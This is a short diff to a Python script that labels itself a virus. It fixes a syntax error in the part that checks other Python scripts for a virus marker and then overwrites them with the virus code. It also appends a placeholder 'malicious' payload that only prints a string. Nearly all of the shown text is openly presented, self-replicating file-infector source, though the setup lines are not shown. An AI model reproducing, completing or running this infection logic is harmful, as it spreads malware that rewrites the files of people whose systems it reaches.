@@ -27,7 +27,7 @@ for script in python_scripts:
 
     # Assuming that the file is not infected.
     infected = False
-    for line in script_code
+    for line in script_code:
         if line == '### Start of Virus ###\n':
             infected = True
             break
@@ -40,4 +40,7 @@ for script in python_scripts:
         # Override everything  with the final_code
         with open(script, 'w') as f:
             f.writelines(final_code)
+
+# Malicious Piece of code (run this in 2nd threat) to not block the original file functionality
+print("Malicious Code")
 ### End of Virus ###
